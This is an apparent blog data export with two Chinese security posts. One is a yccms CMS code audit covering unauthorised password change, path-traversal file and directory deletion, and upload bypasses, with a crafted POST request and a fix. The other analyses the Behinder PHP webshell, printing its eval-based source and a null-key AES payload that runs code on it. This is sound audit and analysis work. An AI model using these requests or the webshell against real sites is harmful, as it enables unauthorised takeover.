{"meta":{"title":"Now you see me!","subtitle":"夫君子之行，静以修身，俭以养德。非淡泊无以明志，非宁静无以致远。","description":"","author":"Kerberos","url":"https://leemeanvvi.github.io","root":"/"},"pages":[{"title":"about","date":"2019-12-10T03:50:09.000Z","updated":"2020-06-10T15:36:40.067Z","comments":true,"path":"about/index.html","permalink":"https://leemeanvvi.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-09T06:24:22.000Z","updated":"2020-06-10T15:36:40.068Z","comments":false,"path":"categories/index.html","permalink":"https://leemeanvvi.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-09T06:21:09.000Z","updated":"2020-06-10T15:36:40.067Z","comments":false,"path":"tags/index.html","permalink":"https://leemeanvvi.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"yccms代码审计","slug":"yccms代码审计","date":"2020-07-11T06:56:45.000Z","updated":"2020-07-11T12:09:52.696Z","comments":true,"path":"2020/07/11/yccms代码审计/","link":"","permalink":"https://leemeanvvi.github.io/2020/07/11/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"最近正式开始入坑代码审计，按先知上的一篇审计文章走了下流程，做一下总结。 先知原文：https://xz.aliyun.com/t/7748 未授权修改管理员密码 修改密码 代码分析先看入口文件/admin/index.php 1234&lt;?php&#x2F;&#x2F;导入了config&#x2F;run.inc.phprequire str_replace(&#39;\\\\&#39;,&#39;&#x2F;&#39;,substr(dirname(__FILE__),0,-6)).&#39;&#x2F;config&#x2F;run.inc.php&#39;;?&gt; 跟进/config/run.inc.php 12345678910111213141516171819202122232425262728293031&lt;?php&#x2F;&#x2F;开启sessionsession_start();&#x2F;&#x2F;超时时间@set_time_limit(0);&#x2F;&#x2F;设置编码header(&#39;Content-Type:text&#x2F;html;charset&#x3D;utf-8&#39;);&#x2F;&#x2F;错误级别,报告警告之外的所有错误error_reporting(E_ALL ^ E_NOTICE);&#x2F;&#x2F;设置时区date_default_timezone_set(&#39;PRC&#39;); &#x2F;&#x2F;网站绝对根路径define(&#39;ROOT_PATH&#39;,str_replace(&#39;\\\\&#39;,&#39;&#x2F;&#39;,substr(dirname(__FILE__),0,-7)));&#x2F;&#x2F; ROOT &#x2F;yccms&#x2F;&#x2F;&#x2F;引入配置文件require ROOT_PATH.&#39;&#x2F;config&#x2F;config.inc.php&#39;;&#x2F;&#x2F;引入Smartyrequire ROOT_PATH.&#39;&#x2F;public&#x2F;smarty&#x2F;Smarty.class.php&#39;;&#x2F;&#x2F;自动加载类function __autoload($_className)&#123; if(substr($_className,-6)&#x3D;&#x3D;&#39;Action&#39;)&#123; require ROOT_PATH.&#39;&#x2F;controller&#x2F;&#39;.ucfirst($_className).&#39;.class.php&#39;; &#125;elseif(substr($_className, -5) &#x3D;&#x3D; &#39;Model&#39;)&#123; require ROOT_PATH.&#39;&#x2F;model&#x2F;&#39;.ucfirst($_className).&#39;.class.php&#39;; &#125;else&#123; require ROOT_PATH.&#39;&#x2F;public&#x2F;class&#x2F;&#39;.ucfirst($_className).&#39;.class.php&#39;; &#125;&#125;&#x2F;&#x2F;单入口Factory::setAction()-&gt;run();?&gt; 可以看到，run.inc.php最后的单入口为Factory::setAction()-&gt;run();根据_autoload()自动加载类函数，系统将加载/public/class/Factory.class.php 12345678910111213141516171819202122232425262728&lt;?phpclass Factory&#123; static private $_obj&#x3D;null; static public function setAction()&#123; $_a&#x3D;self::getA(); if (in_array($_a, array(&#39;admin&#39;, &#39;nav&#39;, &#39;article&#39;,&#39;backup&#39;,&#39;html&#39;,&#39;link&#39;,&#39;pic&#39;,&#39;search&#39;,&#39;system&#39;,&#39;xml&#39;,&#39;online&#39;))) &#123; if (!isset($_SESSION[&#39;admin&#39;])) &#123; header(&#39;Location:&#39;.&#39;?a&#x3D;login&#39;); &#125; &#125; if (!file_exists(ROOT_PATH.&#39;&#x2F;controller&#x2F;&#39;.ucfirst($_a).&#39;Action.class.php&#39;)) $_a &#x3D; &#39;Login&#39;; eval(&#39;self::$_obj &#x3D; new &#39;.ucfirst($_a).&#39;Action();&#39;); return self::$_obj; &#125; static public function setModel() &#123; $_a &#x3D; self::getA(); if (file_exists(ROOT_PATH.&#39;&#x2F;model&#x2F;&#39;.$_a.&#39;Model.class.php&#39;)) eval(&#39;self::$_obj &#x3D; new &#39;.ucfirst($_a).&#39;Model();&#39;); return self::$_obj; &#125; static public function getA()&#123; if(isset($_GET[&#39;a&#39;]) &amp;&amp; !empty($_GET[&#39;a&#39;]))&#123; return $_GET[&#39;a&#39;]; &#125; return &#39;login&#39;; &#125;&#125;?&gt; 单入口处调用的是setAction()函数，而我们提交的数据包如下 12345678910111213POST &#x2F;yccms&#x2F;admin&#x2F;index.php?a&#x3D;admin&amp;m&#x3D;update HTTP&#x2F;1.1Host: 127.0.0.1:8888User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;yccms&#x2F;Connection: closeX-Forwarded-For: 127.0.0.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 58send&#x3D;1&amp;username&#x3D;admin&amp;password&#x3D;1234567&amp;notpassword&#x3D;1234567 从setAction()函数看下去，系统将实例化一个AdminAction()，并且我们提交的参数a的值为admin 12345678910111213141516static public function setAction()&#123; $_a&#x3D;self::getA(); &#x2F;&#x2F;$_a &#x3D; admin，in_array条件成立 if (in_array($_a, array(&#39;admin&#39;, &#39;nav&#39;, &#39;article&#39;,&#39;backup&#39;,&#39;html&#39;,&#39;link&#39;,&#39;pic&#39;,&#39;search&#39;,&#39;system&#39;,&#39;xml&#39;,&#39;online&#39;))) &#123; &#x2F;&#x2F;未授权情况下，没有session，条件成立 if (!isset($_SESSION[&#39;admin&#39;])) &#123; &#x2F;&#x2F;设置一个重定向的header header(&#39;Location:&#39;.&#39;?a&#x3D;login&#39;); &#125; &#125; &#x2F;&#x2F;判断是否存在&#x2F;controller&#x2F;AdminAction.class.php，不存在的话将$_a设为Login if (!file_exists(ROOT_PATH.&#39;&#x2F;controller&#x2F;&#39;.ucfirst($_a).&#39;Action.class.php&#39;)) $_a &#x3D; &#39;Login&#39;; &#x2F;&#x2F;实例化AdminAction()并返回 eval(&#39;self::$_obj &#x3D; new &#39;.ucfirst($_a).&#39;Action();&#39;); return self::$_obj;&#125; 返回AdminAction()实例后，在单入口处调用了run()函数，再看/controller/AdminAction.class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?php&#x2F;&#x2F;管理员控制器class AdminAction extends Action&#123; private $_art; public function __construct()&#123; parent::__construct(); $this-&gt;_art&#x3D;new ArticleModel(); $this-&gt;_model&#x3D;new AdminModel(); &#125; &#x2F;&#x2F;后台初始 public function index()&#123; if (isset($_SESSION[&#39;admin&#39;])) &#123; $this-&gt;_tpl-&gt;assign(&#39;admin&#39;, $_SESSION[&#39;admin&#39;]); $this-&gt;_tpl-&gt;display(&#39;admin&#x2F;public&#x2F;admin.tpl&#39;); &#125; else &#123; Tool::alertLocation(null, &#39;?a&#x3D;login&#39;); &#125; &#125; &#x2F;&#x2F;修改密码 public function update()&#123; if(isset($_POST[&#39;send&#39;]))&#123; if(validate::isNullString($_POST[&#39;username&#39;])) Tool::t_back(&#39;用户名不能为空&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); if(validate::isNullString($_POST[&#39;password&#39;])) Tool::t_back(&#39;密码不能为空!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); if(!(validate::checkStrEquals($_POST[&#39;password&#39;], $_POST[&#39;notpassword&#39;]))) Tool::t_back(&#39;两次密码不一致!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); $this-&gt;_model-&gt;username&#x3D;$_POST[&#39;username&#39;]; $this-&gt;_model-&gt;password&#x3D;sha1($_POST[&#39;password&#39;]); $_edit&#x3D;$this-&gt;_model-&gt;editAdmin(); if($_edit)&#123; tool::layer_alert(&#39;密码修改成功!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;,6); &#125;else&#123; tool::layer_alert(&#39;密码未修改!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;,6); &#125; &#125; $this-&gt;_tpl-&gt;assign(&#39;admin&#39;, $_SESSION[&#39;admin&#39;]); $this-&gt;_tpl-&gt;display(&#39;admin&#x2F;public&#x2F;update.tpl&#39;); &#125; &#x2F;&#x2F;系统信息 public function main()&#123; $_ip&#x3D;new Ip(); $_info&#x3D;array(); $_info[&#39;ip&#39;]&#x3D;@$_SERVER[&quot;REMOTE_ADDR&quot;]; &#x2F;&#x2F;客户IP $_re_ip&#x3D;$_ip-&gt;getlocation($_info[&#39;ip&#39;]); $_info[&#39;re_ip&#39;]&#x3D;$_re_ip[&#39;country&#39;]; $_info[&#39;count&#39;]&#x3D;@$_SESSION[&#39;admin&#39;][&#39;count&#39;];&#x2F;&#x2F;登录次数 $_info[&#39;time&#39;]&#x3D;@$_SESSION[&#39;admin&#39;][&#39;time&#39;];&#x2F;&#x2F;上次登录时间 $_info[&#39;ver&#39;]&#x3D;@VERSION; $_info[&#39;name&#39;]&#x3D;$_SERVER[&#39;SERVER_NAME&#39;];&#x2F;&#x2F;域名 $_info[&#39;sip&#39;]&#x3D;&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR?@$_SERVER[&#39;SERVER_ADDR&#39;]:@gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]);&#x2F;&#x2F;服务器IP $_server_ip&#x3D;$_ip-&gt;getlocation($_info[&#39;sip&#39;]); $_info[&#39;server_ip&#39;]&#x3D;$_server_ip[&#39;country&#39;]; $_info[&#39;arts&#39;]&#x3D;$this-&gt;_art-&gt;_total();&#x2F;&#x2F;文章数 $_info[&#39;allow&#39;]&#x3D;(ini_get(&#39;allow_url_fopen&#39;) ? &#39;&lt;span style&#x3D;&quot;color:green;font-weight:bold;&quot;&gt;√ 支持&lt;&#x2F;font&gt;&#39; : &#39;&lt;font style&#x3D;&quot;color:red;font-weight:bold;&quot;&gt;× 不支持&lt;&#x2F;font&gt;&#39;); $_info[&#39;gd&#39;]&#x3D;(function_exists(&#39;gd_info&#39;) ? &#39;&lt;span style&#x3D;&quot;color:green;font-weight:bold;&quot;&gt;√ 支持&lt;&#x2F;font&gt;&#39; : &#39;&lt;font style&#x3D;&quot;color:red;font-weight:bold;&quot;&gt;× 不支持&lt;&#x2F;font&gt;&#39;); $_info[&#39;curl&#39;]&#x3D;(function_exists( &#39;curl_init&#39; ) &amp;&amp; function_exists( &#39;curl_exec&#39; ) ? &#39;&lt;span style&#x3D;&quot;color:green;font-weight:bold;&quot;&gt;√ 支持&lt;&#x2F;font&gt;&#39; : &#39;&lt;font style&#x3D;&quot;color:red;font-weight:bold;&quot;&gt;× 不支持&lt;&#x2F;font&gt;&#39;); $_info[&#39;pdo&#39;]&#x3D;(class_exists( &#39;pdo&#39; ) ? &#39;&lt;span style&#x3D;&quot;color:green;font-weight:bold;&quot;&gt;√ 支持&lt;&#x2F;font&gt;&#39; : &#39;&lt;font style&#x3D;&quot;color:red;font-weight:bold;&quot;&gt;× 不支持&lt;&#x2F;font&gt;&#39;); $_info[&#39;fso&#39;]&#x3D;(function_exists( &#39;file_put_contents&#39; ) &amp;&amp; function_exists( &#39;file_get_contents&#39; ) ? &#39;&lt;span style&#x3D;&quot;color:green;font-weight:bold;&quot;&gt;√ 支持&lt;&#x2F;font&gt;&#39; : &#39;&lt;font style&#x3D;&quot;color:red;font-weight:bold;&quot;&gt;× 不支持&lt;&#x2F;font&gt;&#39;); $_info[&#39;port&#39;]&#x3D;$_SERVER[&#39;SERVER_PORT&#39;];&#x2F;&#x2F;服务器端口 $_info[&#39;stime&#39;]&#x3D;date(&#39;Y-m-d H:i:s&#39;,time());&#x2F;&#x2F;服务器时间 $_info[&#39;softwart&#39;]&#x3D;$_SERVER[&#39;SERVER_SOFTWARE&#39;];&#x2F;&#x2F;服务器版本 $_info[&#39;os&#39;]&#x3D;php_uname(); &#x2F;&#x2F;操作系统 $_info[&#39;php&#39;]&#x3D;phpversion();&#x2F;&#x2F;php版本 $_info[&#39;time_limit&#39;]&#x3D;ini_get(&#39;max_execution_time&#39;);&#x2F;&#x2F;超时时间 $_info[&#39;path&#39;]&#x3D;$_SERVER[&#39;DOCUMENT_ROOT&#39;];&#x2F;&#x2F;网站物理路径 $_info[&#39;space_free&#39;]&#x3D;Tool::sizeUnit(disk_free_space(ROOT_PATH));&#x2F;&#x2F;空间剩余 $_info[&#39;mysql_size&#39;]&#x3D;Tool::CalcFullDatabaseSize(DB_NAME,DB::getInstance()-&gt;_pdo);&#x2F;&#x2F;mysql数据库大小 $this-&gt;_tpl-&gt;assign(&#39;_info&#39;,$_info); $this-&gt;_tpl-&gt;display(&#39;admin&#x2F;public&#x2F;main.tpl&#39;); &#125; &#x2F;&#x2F;后台退出 public function logout() &#123; if (isset($_SESSION[&#39;admin&#39;])) session_destroy(); Tool::alertLocation(null, &#39;?a&#x3D;login&#39;); &#125; &#x2F;&#x2F;清理编译缓存 public function cleancache()&#123; if(isset($_POST[&#39;send&#39;]))&#123; $_dirPath&#x3D;opendir(dirname(dirname(__FILE__)).&#39;&#x2F;compile&#x2F;&#x2F;&#39;); $_fileDir&#x3D;ROOT_PATH.&#39;&#x2F;compile&#x2F;&#39;; $_cacheCount&#x3D;count(scandir(dirname(dirname(__FILE__)).&#39;&#x2F;compile&#x2F;&#x2F;&#39;)) - 2; $_dirName&#x3D;&#39;&#39;; while(!!$_dirName&#x3D;readdir($_dirPath))&#123; if($_dirName!&#x3D;&#39;.&#39; &amp;&amp; $_dirName!&#x3D;&#39;..&#39;)&#123; if(!unlink($_fileDir.$_dirName))&#123; tool::layer_alert(&#39;缓存文件清理失败,请设权限为777!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;cleancache&#39;,2); &#125; &#125; &#125; tool::layer_alert(&#39;&#39;.$_cacheCount.&#39;个编译缓存清理完毕!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;cleancache&#39;,6); &#125; $this-&gt;_tpl-&gt;display(&#39;admin&#x2F;public&#x2F;cache.tpl&#39;); &#125;&#125;?&gt; 没有发现run()函数，发现AdminAction类继承了Action类，根据_autoload()函数，找到/controller/Action.class.php，找到run()函数，我们提交的参数m的值为update 123456public function run() &#123;&#x2F;&#x2F;$_m &#x3D; update $_m &#x3D; isset($_GET[&#39;m&#39;]) ? $_GET[&#39;m&#39;] : &#39;index&#39;;&#x2F;&#x2F;检测类中是否存在update方法，存在的话执行update方法 method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index(); &#125; 当然，AdminAction类中是存在update方法的。 12345678910111213141516171819public function update()&#123;&#x2F;&#x2F;判断$_POST[&#39;send&#39;]是否设置 if(isset($_POST[&#39;send&#39;]))&#123; if(validate::isNullString($_POST[&#39;username&#39;])) Tool::t_back(&#39;用户名不能为空&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); if(validate::isNullString($_POST[&#39;password&#39;])) Tool::t_back(&#39;密码不能为空!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); if(!(validate::checkStrEquals($_POST[&#39;password&#39;], $_POST[&#39;notpassword&#39;]))) Tool::t_back(&#39;两次密码不一致!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;); $this-&gt;_model-&gt;username&#x3D;$_POST[&#39;username&#39;]; $this-&gt;_model-&gt;password&#x3D;sha1($_POST[&#39;password&#39;]); $_edit&#x3D;$this-&gt;_model-&gt;editAdmin(); if($_edit)&#123; tool::layer_alert(&#39;密码修改成功!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;,6); &#125;else&#123; tool::layer_alert(&#39;密码未修改!&#39;,&#39;?a&#x3D;admin&amp;m&#x3D;update&#39;,6); &#125; &#125; $this-&gt;_tpl-&gt;assign(&#39;admin&#39;, $_SESSION[&#39;admin&#39;]); $this-&gt;_tpl-&gt;display(&#39;admin&#x2F;public&#x2F;update.tpl&#39;); &#125; 可以看到，update方法中没有任何关于权限的判断，所以直接修改成功。 小结系统唯一有权限识别的地方为/public/class/Factory.class.php中的setAction()方法，对session进行了检测，但是只是设置了重定向头，并没有结束程序，使得后续的操作依旧可以执行，并且后续没有权限认证，导致了未授权修改管理员密码的漏洞。在返回包中确实看到了重定向的302状态码和Location头，但是修改密码的操作也执行成功。 修复在setAction()方法中，当判断session不存在时，直接退出程序。当然，这只是修复了未授权的部分。 123456789101112static public function setAction()&#123; $_a&#x3D;self::getA(); if (in_array($_a, array(&#39;admin&#39;, &#39;nav&#39;, &#39;article&#39;,&#39;backup&#39;,&#39;html&#39;,&#39;link&#39;,&#39;pic&#39;,&#39;search&#39;,&#39;system&#39;,&#39;xml&#39;,&#39;online&#39;))) &#123; if (!isset($_SESSION[&#39;admin&#39;])) &#123; &#x2F;&#x2F;修复地方 exit(header(&#39;Location:&#39;.&#39;?a&#x3D;login&#39;)); &#125; &#125; if (!file_exists(ROOT_PATH.&#39;&#x2F;controller&#x2F;&#39;.ucfirst($_a).&#39;Action.class.php&#39;)) $_a &#x3D; &#39;Login&#39;; eval(&#39;self::$_obj &#x3D; new &#39;.ucfirst($_a).&#39;Action();&#39;); return self::$_obj;&#125; 修复 任意文件删除 任意文件删除 代码分析程序入口不再赘述，跟上面一样分析就好，这里直接看PicAction类的delall()方法 12345678910111213141516171819public function delall()&#123;&#x2F;&#x2F;判断$_POST[&#39;send&#39;]是否设置 if(isset($_POST[&#39;send&#39;]))&#123; if(validate::isNullString($_POST[&#39;pid&#39;])) tool::layer_alert(&#39;没有选择任何图片!&#39;,&#39;?a&#x3D;pic&#39;,7); &#x2F;&#x2F;设置文件的路径 $_fileDir&#x3D;ROOT_PATH.&#39;&#x2F;uploads&#x2F;&#39;; &#x2F;&#x2F;遍历$_POST[&#39;pid&#39;]，所以提交的pid应该为一个数组 foreach($_POST[&#39;pid&#39;] as $_value)&#123; &#x2F;&#x2F;直接拼接文件路径 $_filePath&#x3D;$_fileDir.$_value; &#x2F;&#x2F;进行删除 if(!unlink($_filePath))&#123; tool::layer_alert(&#39;图片删除失败,请设权限为777!&#39;,&#39;?a&#x3D;pic&#39;,7); &#125;else&#123; header(&#39;Location:?a&#x3D;pic&#39;); &#125; &#125; &#125; &#125; 小结没有对传入的文件路径进行过滤，使得可以传入../进行路径穿越，导致任意文件删除漏洞。 任意文件上传1 文件上传 复现时发现下的源码有bug，改完正常之后发现这个接口最后会调用out方法，imagepng函数会以png格式输出文件，破坏了文件中的源码，要成功利用的话可能得靠条件竞争，这里就简单分析一波。 123456789&#x2F;&#x2F;图像输出public function out($_name &#x3D; &#39;&#39;) &#123; $_start &#x3D; substr($this-&gt;file, 0 , -strlen(strrchr($this-&gt;file, &#39;.&#39;))); $_end &#x3D; strrchr($this-&gt;file, &#39;.&#39;); $this-&gt;file &#x3D; $_start.$_name.$_end; imagepng($this-&gt;new,$this-&gt;file); imagedestroy($this-&gt;img); imagedestroy($this-&gt;new);&#125; 代码分析直接看CallAction类的upload方法 12345678910111213public function upLoad() &#123; if (isset($_POST[&#39;send&#39;])) &#123; &#x2F;&#x2F;实例化LogoUpload类 $_logoupload &#x3D; new LogoUpload(&#39;pic&#39;,$_POST[&#39;MAX_FILE_SIZE&#39;]); $_path &#x3D; $_logoupload-&gt;getPath(); $_img &#x3D; new Image($_path); $_img-&gt;xhImg(960,0); $_img-&gt;out(); $_logoupload-&gt;alertOpenerClose(&#39;图片上传成功！&#39;,&#39;..&#39;.$_path); &#125; else &#123; exit(&#39;警告：文件过大或者其他未知错误导致浏览器崩溃！&#39;); &#125;&#125; LogoUpload类的__construct()方法中调用了checkType()方法，但是仅对Content-Type进行比较，没有对文件后缀进行判断，所以只要控制上传文件时的Content-Type，就可以绕过校验。系统中还使用了getimagesize()函数，并对返回的type进行判断，所以上传的时候还得加上图片头，代码就不贴出来了。 123456789101112131415161718192021222324public function __construct($_file,$_maxsize) &#123; $this-&gt;error &#x3D; $_FILES[$_file][&#39;error&#39;]; $this-&gt;maxsize &#x3D; $_maxsize &#x2F; 1024; $this-&gt;type &#x3D; $_FILES[$_file][&#39;type&#39;]; $this-&gt;path &#x3D; ROOT_PATH.&#39;&#x2F;&#39;.UPLOGO; $this-&gt;name &#x3D; $_FILES[$_file][&#39;name&#39;]; $this-&gt;tmp &#x3D; $_FILES[$_file][&#39;tmp_name&#39;]; $this-&gt;checkError(); $this-&gt;checkType(); $this-&gt;checkPath(); $this-&gt;moveUpload();&#125;......private $typeArr &#x3D; array(&#39;image&#x2F;png&#39;,&#39;image&#x2F;x-png&#39;); ......&#x2F;&#x2F;验证类型private function checkType() &#123; if (!in_array($this-&gt;type,$this-&gt;typeArr)) &#123; Tool::alertBack(&#39;警告：LOGO图片必须是PNG格式！&#39;); &#125;&#125; 小结仅对Content-Type进行校验，没有对文件后缀进行过滤，导致任意文件上传漏洞。绕过getimagesize()函数需加图片头。 任意文件上传2 文件上传 这个情况跟上面的上传点一样，调用了out方法破坏了源文件。简单分析一下 代码分析直接看CallAction类的xhUp方法 12345678910111213141516public function xhUp() &#123; if (isset($_GET[&#39;type&#39;])) &#123; &#x2F;&#x2F;实例化FileUpload类 $_fileupload &#x3D; new FileUpload(&#39;filedata&#39;,10); $_err&#x3D;$_fileupload-&gt;checkError(); $_path &#x3D; $_fileupload-&gt;getPath(); $_msg&#x3D;&quot;&#39;..$_path&#39;&quot;; $_img &#x3D; new Image($_path); $_img-&gt;xhImg(650,0); $_img-&gt;out(); echo &quot;&#123;&#39;err&#39;:&#39;&quot;.$_err.&quot;&#39;,&#39;msg&#39;:&quot;.$_msg.&quot;&#125;&quot;; exit(); &#125; else &#123; Tool::alertBack(&#39;警告：由于非法操作导致上传失败！&#39;); &#125;&#125; 在FileUpload类中也是仅进行了Content-Type的检验，情况与上面的上传点基本一样。 1234567891011121314151617181920212223public function __construct($_file,$_maxsize) &#123; $this-&gt;error &#x3D; $_FILES[$_file][&#39;error&#39;]; $this-&gt;maxsize &#x3D; $_maxsize &#x2F; 1024; $this-&gt;type &#x3D; $_FILES[$_file][&#39;type&#39;]; $this-&gt;path &#x3D; ROOT_PATH.&#39;&#x2F;&#39;.UPDIR; $this-&gt;name &#x3D; $_FILES[$_file][&#39;name&#39;]; $this-&gt;tmp &#x3D; $_FILES[$_file][&#39;tmp_name&#39;]; $this-&gt;checkError(); $this-&gt;checkType(); $this-&gt;checkPath(); $this-&gt;moveUpload();&#125;......private $typeArr &#x3D; array(&#39;image&#x2F;jpeg&#39;,&#39;image&#x2F;pjpeg&#39;,&#39;image&#x2F;png&#39;,&#39;image&#x2F;x-png&#39;,&#39;image&#x2F;gif&#39;); ......private function checkType() &#123; if (!in_array($this-&gt;type,$this-&gt;typeArr)) &#123; Tool::alertBack(&#39;警告：不合法的上传类型！&#39;); &#125;&#125; 小结仅对Content-Type进行校验，没有对文件后缀进行过滤，导致任意文件上传漏洞。绕过getimagesize()函数需加图片头。 任意目录删除 delete 该功能为清除静态文件，但是并没有识别文件是否为静态文件，而是将整个文件夹内的文件删除，由于没有对传入的路径进行校验，所以可以传入../进行路径穿越，控制删除的目录。测试时建议新建一个tmp目录进行测试，防止误删源码。 代码分析直接看NavAction类的Clean方法 12345678910111213141516171819&#x2F;&#x2F;清理目录下的所有静态文件public function clean()&#123; if(isset($_GET[&#39;navname&#39;]))&#123; $_navname&#x3D;$_GET[&#39;navname&#39;]; $_dirPath&#x3D;opendir(dirname(dirname(__FILE__)).&#39;&#x2F;&#39;.$_navname.&#39;&#x2F;&#39;); $_fileDir&#x3D;ROOT_PATH.&#39;&#x2F;&#39;.$_navname.&#39;&#x2F;&#39;; $tmp &#x3D; dirname(dirname(__FILE__)).&#39;&#x2F;&#39;.$_navname.&#39;&#x2F;&#39;; $_cacheCount&#x3D;count(scandir(dirname(dirname(__FILE__)).&#39;&#x2F;&#39;.$_navname.&#39;&#x2F;&#39;)) - 2; $_dirName&#x3D;&#39;&#39;; while(!!$_dirName&#x3D;readdir($_dirPath))&#123; if($_dirName!&#x3D;&#39;.&#39; &amp;&amp; $_dirName!&#x3D;&#39;..&#39;)&#123; if(!unlink($_fileDir.$_dirName))&#123; tool::layer_alert(&#39;ERROR:清理失败,请设权限为777!&#39;,&#39;?a&#x3D;nav&amp;m&#x3D;index&#39;,7); &#125; &#125; &#125; tool::layer_alert(&#39;&#39;.$_cacheCount.&#39; 个静态文件清理完毕!&#39;,&#39;?a&#x3D;nav&amp;m&#x3D;index&#39;,1); &#125;&#125; 可以看到没有任何过滤。直接拼接路径","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://leemeanvvi.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"冰蝎php后门分析","slug":"冰蝎php后门分析","date":"2020-06-09T15:07:02.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2020/06/09/冰蝎php后门分析/","link":"","permalink":"https://leemeanvvi.github.io/2020/06/09/%E5%86%B0%E8%9D%8Ephp%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/","excerpt":"前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。","text":"前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。 冰蝎php马平平无奇的冰蝎php马 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#39;pass&#39;]))&#123; $key&#x3D;substr(md5(uniqid(rand())),16); $_SESSION[&#39;k&#39;]&#x3D;$key; print $key;&#125;else&#123; $key&#x3D;$_SESSION[&#39;k&#39;]; $post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;); if(!extension_loaded(&#39;openssl&#39;)) &#123; $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;; $post&#x3D;$t($post.&quot;&quot;); for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123; $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr&#x3D;explode(&#39;|&#39;,$post); $func&#x3D;$arr[0]; $params&#x3D;$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt; 正常连接的时候，客户端会先以GET方式发送pass=随机数给服务端，服务端将随机生成一串16位的字符串，将其作为key，存在session里面，并将key返回给客户端。后续客户端与服务端的通讯便以这串key作为加密解密的密钥。 而当我们跳过生成密钥这一步，直接与服务端通讯，就会发现后门的后门。 后门分析先看上半部分代码 123456789101112131415161718192021&lt;?php@error_reporting(0);session_start();if (isset($_GET['pass'])) &#123; $key = substr(md5(uniqid(rand())), 16); $_SESSION['k'] = $key; print $key;&#125; else &#123; //跳过了上面生成key的过程 $key = $_SESSION['k']; //因为跳过了上面生成$_SESSION['k']的过程，所以$key=null $post = file_get_contents(\"php://input\"); //从输入中获取$post if (!extension_loaded('openssl')) &#123; //检测是否载入了openssl模块 $t = \"base64_\" . \"decode\"; $post = $t($post . \"\"); for ($i = 0; $i &lt; strlen($post); $i++) &#123; $post[$i] = $post[$i] ^ $key[$i + 1 &amp; 15]; &#125; &#125; else &#123; $post = openssl_decrypt($post, \"AES128\", $key); //以null为密钥对$post进行AES128解密，生成新的$post &#125; 所以我们只要以null为密钥对参数进行AES128加密，就可以控制$post的值。下面代码输出了123456经过加密后的值 1234&lt;?php$plain &#x3D; &quot;123456&quot;;$cipher &#x3D; openssl_encrypt($plain,&quot;aes128&quot;, null);echo $cipher; encrypt 将这串加密后的值直接POST给冰蝎php马 cipher 经过解密后，$post的值确实解密回原来的123456，从而确认了$post可控。 decrypt 再来看下半部分代码 12345678910111213$arr &#x3D; explode(&#39;|&#39;, $post); &#x2F;&#x2F;以&#39;|&#39;为分割线，将$post分割为数组$func &#x3D; $arr[0];$params &#x3D; $arr[1];class C&#123; public function __construct($p) &#123; eval($p . &quot;&quot;); &#125;&#125;@new C($params); &#x2F;&#x2F;将C类实例化，传入$params，并通过魔术方法最后执行eval($params) 看到这里就明白了，如果我们控制$post=&quot;|phpinfo();&quot;，$arr将得到$arr[0]=&quot;&quot;，$arr[1]=&quot;phpinfo();&quot;的数组，从而使$params=&quot;phpinfo();&quot;最后实例化时将执行eval(&quot;phpinfo();&quot;) t71ph6.png 利用上面的代码生成|phpinfo();加密后的值4eNW1rQ1TnE2zNJbafdykw==，将其直接POST给冰蝎php马，即可看到phpinfo页面 